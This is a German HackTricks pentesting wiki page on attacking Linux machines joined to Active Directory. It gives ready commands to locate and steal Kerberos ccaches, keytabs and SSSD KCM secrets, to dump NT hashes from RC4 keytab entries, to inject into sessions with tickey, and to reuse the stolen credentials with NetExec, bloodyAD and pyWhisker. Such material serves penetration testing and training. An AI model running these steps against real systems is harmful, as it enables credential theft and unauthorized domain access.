# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Ein Linux-Rechner kann sich ebenfalls in einer Active-Directory-Umgebung befinden.

Ein Linux-Rechner innerhalb einer AD kann **Kerberos-Material lokal speichern**: Benutzer-ccaches, Maschinen-/Dienst-Keytabs und von SSSD verwaltete Secrets. Diese Artefakte lassen sich in der Regel wie alle anderen Kerberos-Anmeldedaten wiederverwenden. Um die meisten davon auszulesen, musst du der Benutzer sein, dem das Ticket gehört, oder **root** auf dem Rechner sein.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Aufzählung

### AD-Aufzählung unter Linux

Wenn du unter Linux (oder in einer Bash unter Windows) Zugriff auf ein AD hast, kannst du versuchen, mit [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) das AD aufzuzählen.

Auf der folgenden Seite findest du außerdem **weitere Möglichkeiten, ein AD unter Linux aufzuzählen**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA ist eine Open-Source-**Alternative** zu Microsoft Windows **Active Directory**, hauptsächlich für **Unix**-Umgebungen. Es kombiniert ein vollständiges **LDAP-Verzeichnis** mit einem MIT-**Kerberos**-Key Distribution Center für eine Verwaltung ähnlich wie bei Active Directory. Durch die Verwendung des Dogtag-**Certificate System** für die Verwaltung von CA- und RA-Zertifikaten unterstützt es **Multi-Faktor-Authentifizierung**, einschließlich Smartcards. SSSD ist für Unix-Authentifizierungsprozesse integriert.<sup>[[14]](#references)[[15]](#references)</sup> Erfahre mehr darüber unter:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefakte auf einer domänengebundenen Maschine

Bevor du Tickets untersuchst, solltest du herausfinden, **wie die Maschine in AD eingebunden wurde** und **wo das Kerberos-Material tatsächlich gespeichert ist**. Auf modernen Linux-Rechnern wird dies üblicherweise von `realmd` + `adcli` + `sssd` übernommen und nicht nur durch einfache Dateien in `/tmp`.<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

Dies zeigt schnell, ob der Host AD vertraut, ob SSSD Identitäten oder Tickets zwischenspeichert und ob **Machine-/Service-Keytabs** oder **KCM-Secrets** für einen Missbrauch verfügbar sind.<sup>[[4]](#references)[[10]](#references)</sup>

Behandle `/var/lib/sss/db/cache_*.ldb` getrennt von Kerberos-CCaches und `/var/lib/sss/secrets/secrets.ldb`. Die Dateien `cache_*.ldb` können Offline-Passwortverifizierer enthalten, wenn für eine Domain `cache_credentials = true` gesetzt ist **und** sich der Benutzer zuvor auf diesem Host authentifiziert hat. Normalerweise sind sie nur mit privilegiertem Zugriff lesbar. Eine Cache-Datei oder eine aktivierte Einstellung allein beweist nicht, dass ein verwendbares, aktuelles Passwort vorliegt. Prüfe die effektive Einstellung pro Domain und die tatsächlich zwischengespeicherten Identitäten, bevor du zu diesem Schluss kommst. Siehe [Red Hats Dokumentation zum SSSD-Credential-Cache](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication). Bei einer separaten Linux-zu-AD-Identitätsgrenze ist [Kerberos-Namenszuordnung zwischen verschiedenen Herstellern](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) nur relevant, wenn ein Dienst das Ticket akzeptiert und dessen Principal dem betreffenden Unix-Konto zuordnet.

Auf einem Host mit `ksu` kann ein gültiger Kerberos-Principal ein **lokales Zielkonto** erreichen, einschließlich root, aber nur, wenn dieses Konto den Principal autorisiert. [Die MIT-Kerberos-Dokumentation](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html) beschreibt die Dateien `.k5login` und `.k5users` im Home-Verzeichnis des Zielkontos sowie das Name-Mapping-Fallback, wenn keine der beiden Dateien vorhanden ist. `.k5users` kann außerdem Befehle für `ksu -e` einschränken; der Dateiname allein beweist keinen Shell-Zugriff. Prüfe das konkrete Zielkonto, Dateieigentümer und Berechtigungen, lesbare Autorisierungseinträge, verfügbare Kerberos-Credentials und effektive Mapping-Regeln. Ist das Root-Home-Verzeichnis nicht zugänglich, bleibt der Autorisierungsstatus unbekannt. Eine passive Enumeration sollte diese Pfade und Berechtigungen auflisten, ohne Tickets anzufordern oder `ksu` auszuführen.

Ein geplanter Backup-Job kann indirekt eine Autorisierungsgrenze durch `.k5login` schaffen. Wenn ein Konto mit höheren Rechten ein Verzeichnis, in das ein Benutzer mit niedrigeren Rechten schreiben kann, rekursiv in sein eigenes Home-Verzeichnis kopiert, prüfe, ob der Kopiervorgang versteckte Dateien einschließt, ob der Zielpfad dem effektiven Home-Verzeichnis des Kontos entspricht und ob die resultierende Datei einem Eigentümer gehört, den der Kerberos-Login-Dienst akzeptiert. Beispielsweise dokumentiert [rsync](https://download.samba.org/pub/rsync/rsync.1.html), dass `-a --no-owner` neu erstellte Zieldateien dem empfangenden Benutzer zuordnet. [Die MIT-Kerberos-Dokumentation](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html) beschreibt, wie ein Principal in der `.k5login` dieses Benutzers den Zugriff autorisieren kann. Prüfe die RunAs-Identität des geplanten Jobs, Schreibzugriff auf die Quelle, effektive rsync-Optionen, einen GSSAPI-fähigen Login und ein gültiges Ticket für den aufgeführten Principal. Ein beschreibbares Quellverzeichnis oder ein geplanter rsync-Befehl allein beweist diesen Angriffspfad nicht.

Auch ein lesbarer Keytab muss für jeden Principal einzeln geprüft werden. Ein Keytab mit einem nach Administration benannten Principal beweist für sich genommen keine administrativen Rechte: Die [Richtlinie der KDC-Datei `kadm5.acl`](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html) legt fest, welche Principal-Operationen zulässig sind. Prüfe den Principal, die effektive ACL und die lokale `ksu`- oder Login-Autorisierung getrennt, bevor du den Zugriff auf den Keytab als möglichen Weg zu root behandelst. Bei einer passiven Ersteinschätzung können Pfad und Berechtigungen des Keytabs aufgelistet werden, ohne dessen Schlüssel zu verwenden oder den KDC zu kontaktieren.

## Mit Tickets arbeiten

### Pass The Ticket

Auf dieser Seite findest du verschiedene Orte, an denen du **Kerberos-Tickets auf einem Linux-Host finden kannst**. Auf der folgenden Seite erfährst du, wie du diese CCache-Ticketformate in Kirbi umwandelst (das Format, das du unter Windows verwenden musst) und wie du einen PTT-Angriff ausführst:

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Wenn du nach den **Linux-spezifischen Workflows zum Sammeln von Tickets** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` usw.) suchst, findest du sie auf der entsprechenden Seite:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE-Tickets aus /tmp wiederverwenden

CCACHE-Dateien sind Binärformate zum **Speichern von Kerberos-Credentials**. `FILE:/tmp/krb5cc_%{uid}` ist nach wie vor verbreitet, aber moderne Linux-Deployments verwenden auch `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` oder `KCM:%{uid}`. Prüfe die Umgebungsvariable **`KRB5CCNAME`** und die Einstellung `default_ccache_name`, bevor du annimmst, dass Tickets in `/tmp` liegen.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### CCACHE-Ticket-Wiederverwendung aus dem Keyring

**Kerberos-Tickets, die im Speicher eines Prozesses gespeichert sind, können extrahiert werden**, insbesondere wenn der ptrace-Schutz des Rechners deaktiviert ist (`/proc/sys/kernel/yama/ptrace_scope`). Ein nützliches Tool dafür ist unter [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) zu finden. Es erleichtert die Extraktion, indem es sich in Sitzungen injiziert und Tickets nach `/tmp` dumpet.<sup>[[1]](#references)[[16]](#references)</sup>

Zur Konfiguration und Verwendung dieses Tools werden die folgenden Schritte ausgeführt:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

Dieses Verfahren versucht, in verschiedene Sitzungen zu injizieren. Ein Erfolg wird dadurch angezeigt, dass extrahierte Tickets unter `/tmp` gemäß dem Namensschema `__krb_UID.ccache` gespeichert werden.<sup>[[1]](#references)</sup>

### CCACHE-Ticket-Wiederverwendung aus SSSD KCM

SSSD verwaltet eine Kopie der Datenbank unter dem Pfad `/var/lib/sss/secrets/secrets.ldb`. Der zugehörige Schlüssel wird als versteckte Datei unter dem Pfad `/var/lib/sss/secrets/.secrets.mkey` gespeichert. Standardmäßig ist der Schlüssel nur mit **root**-Berechtigungen lesbar.<sup>[[4]](#references)</sup>

Wird **`SSSDKCMExtractor`** mit den Parametern --database und --key aufgerufen, werden die Datenbank geparst und die **Secrets entschlüsselt**.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

Der Extractor gibt rohe Kerberos-JSON-Payloads aus. Konvertiere sie vor Pass-the-Cache-/Pass-the-Ticket-Angriffen in einen verwendbaren Ticket-Cache oder ein anderes Ticketformat.<sup>[[4]](#references)</sup>

### Schnelle Keytab-Triage

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### Konten aus /etc/krb5.keytab extrahieren

Dienstkontoschlüssel, die für Dienste mit Root-Berechtigungen unverzichtbar sind, werden sicher in Dateien unter **`/etc/krb5.keytab`** gespeichert. Diese Schlüssel sind mit Passwörtern für Dienste vergleichbar und müssen streng vertraulich behandelt werden.<sup>[[5]](#references)</sup>

Um den Inhalt der Keytab-Datei zu untersuchen, kann **`klist`** verwendet werden. Unter Linux gibt `klist -k -K -e` die Principals, Schlüsselversionsnummern, Verschlüsselungstypen und das Rohschlüsselmaterial aus. Wenn der Schlüsseltyp **23 / RC4-HMAC** ist, entspricht der Schlüsselwert auch dem **NT-Hash** dieses Principals.<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Für Linux-Benutzer bietet **`KeyTabExtract`** Funktionen zum Extrahieren des RC4-HMAC-Hashs, der für die Wiederverwendung von NTLM-Hashes genutzt werden kann. Beachte, dass dies nur funktioniert, wenn die Keytab noch **etype 23 / RC4-HMAC**-Material enthält. In **AES-only**-Umgebungen erhältst du möglicherweise keinen wiederverwendbaren NT-Hash, kannst dich aber weiterhin direkt mit der Keytab über Kerberos authentifizieren.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

Unter macOS dient **`bifrost`** als Tool zur Analyse von Keytab-Dateien.<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Unter Verwendung der extrahierten Konto- und Hash-Informationen können mit Tools wie **`NetExec`** Verbindungen zu Servern hergestellt werden.<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### Das Maschinenkonto aus `/etc/krb5.keytab` wiederverwenden

Auf Systemen, die mit `realmd`/`adcli`/`sssd` eingebunden wurden, enthält `/etc/krb5.keytab` normalerweise das **Computerkonto** und einen oder mehrere **Host-/Service-Principals**. Wenn du **root** hast, solltest du die Datei nicht einfach dumpen: Verwende einen der mit `klist -k` aufgelisteten Principals, um ein TGT anzufordern und als Linux-Host selbst zu agieren.<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

Das ist besonders nützlich, wenn das **Computerobjekt** selbst delegierte Rechte in AD hat oder der Host andere Geheimnisse wie ein **gMSA** abrufen darf.<sup>[[13]](#references)</sup>

### Gestohlenes Kerberos-Material mit Linux-orientierten AD-Tools wiederverwenden

Sobald du über ein gültiges `ccache` oder ein nutzbares Keytab verfügst, kannst du **direkt von Linux aus** mit AD arbeiten, ohne vorher alles in Windows-Formate umzuwandeln. Viele moderne Tools unterstützen `KRB5CCNAME` / Kerberos-Authentifizierung nativ.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

Dies ist eine gute Brücke zwischen **Linux post-exploitation** und dem Missbrauch von **AD-Objekten**. Informationen zu den eigentlichen Missbrauchspfaden auf Objektebene findest du hier:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux-gMSA-Artefakte / Artefakte von Managed Service Accounts

Neuere Linux-Deployments können **Managed Service Accounts** direkt aus AD verwenden. In der Praxis bedeutet das: Nach der Kompromittierung eines Linux-Servers findest du möglicherweise nicht nur den Host-Keytab, sondern auch **dienstspezifische Keytabs**, die aus einer gMSA generiert wurden. Häufige Orte zur Überprüfung sind `/etc/gmsad.conf`, deploymentspezifische Konfigurationsdateien und zusätzliche `*.keytab`-Dateien unter `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

Das gibt dir eine wiederverwendbare Kerberos-Identität für die an dieses gMSA gebundenen SPNs, **ohne einen Windows-Endpunkt anzufassen**.<sup>[[13]](#references)</sup> Informationen zum Missbrauch von gMSA/dMSA **auf der Domänenseite** nach Erlangen höherer Berechtigungen in AD findest du hier:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Wie greift man Kerberos an?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Zugriff auf AD mit einem verwalteten Dienstkonto – RHEL-Systeme direkt in Active Directory integrieren](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Kerberos-Umgebungsvariablen – MIT Kerberos-Dokumentation](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos-Dokumentation](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Die von Microsoft Windows verwendeten RC4-HMAC-Kerberos-Verschlüsselungstypen](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Kerberos verwenden | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Identitätsdomänen entdecken und beitreten | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD-Benutzerhandbuch](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Über | FreeIPA-Dokumentation](https://www.freeipa.org/About.html)
- [15] [FreeIPA 4.11.0 – Versionshinweise](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Linux-Kernel-Dokumentation](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos-Dokumentation](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
